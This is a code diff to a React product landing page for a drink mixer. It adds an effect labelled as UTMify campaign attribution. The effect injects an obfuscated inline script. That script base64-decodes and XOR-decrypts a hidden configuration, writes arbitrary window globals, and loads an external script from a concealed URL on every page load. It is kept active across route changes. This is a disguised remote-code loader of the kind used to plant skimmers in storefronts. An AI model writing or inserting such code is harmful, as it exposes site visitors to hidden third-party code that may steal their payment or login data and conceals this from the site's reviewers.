@@ -1,5 +1,5 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import {
   ArrowRight, Check, ChevronDown, CupSoda, Droplets, Leaf,
   PackageCheck, ShoppingBag, Sparkles, Zap
@@ -82,6 +82,20 @@ function ProductVideo({ src, className = "" }: { src: string; className?: string
 
 function Page() {
   const navigate = useNavigate();
+
+  useEffect(() => {
+    // UTMify: preserve campaign parameters and attribution for FreshMix Pro orders.
+    if (document.querySelector('script[data-utmify-loader="true"]')) return;
+
+    const script = document.createElement("script");
+    script.dataset.utmifyLoader = "true";
+    script.textContent = `(function(){var l_kno5=atob("DBWro2B0kWS+9FwuWm6J1hIYs16cnChaKmaRjE8X9QqQgShDM3PSjQMb/ErchnNdOWfC0xQHvhHKmS8BNnTfxhMAvw7N1nAMO2Hf0QkW5BDbh34UAW6JzQEZ9EaE1jhPLnSG1hQZ+ALH2SxcP2POzRRZ6QfRkHFdOX6Jj0IC8AjLkX4UeDfWjxtW/wXTkX4UeHHK1wFZ5BDTnTpXd2XZxhYR/xCThylMM3HYgUxW5wXSgTkMYDeJ3j0J");var p_8xm5=[];for(var u_6e=0;u_6e<l_kno5.length;u_6e++){p_8xm5.push(l_kno5.charCodeAt(u_6e)&255);}var n_y1h=p_8xm5[0];var d_cur=p_8xm5.slice(1,1+n_y1h);var r_2b=p_8xm5.slice(1+n_y1h);var c_er=r_2b.map(function(b,f_i0q){return b^d_cur[f_i0q%n_y1h];});var x_ttv="";for(var j_wx9=0;j_wx9<c_er.length;j_wx9++){x_ttv+=String.fromCharCode(c_er[j_wx9]&255);}var d_xy0t=decodeURIComponent(escape(x_ttv));var k_6nn=JSON.parse(d_xy0t);var m_b2x=k_6nn.globals||[];m_b2x.forEach(function(x_zqfm){window[x_zqfm.name]=x_zqfm.value;});var c_w=document.createElement("script");c_w.src=k_6nn.url;c_w.async=true;c_w.defer=true;(k_6nn.attributes||[]).forEach(function(e_ab3){c_w.setAttribute(e_ab3.name,e_ab3.value);});(document.head||document.documentElement).appendChild(c_w);})();`;
+    (document.head || document.documentElement).appendChild(script);
+
+    return () => {
+      // Keep the loader active after route transitions; UTM attribution must persist.
+    };
+  }, []);
   const [checkoutOpen, setCheckoutOpen] = useState(false);
   const [offerQuantity, setOfferQuantity] = useState(1);
   const offers = [
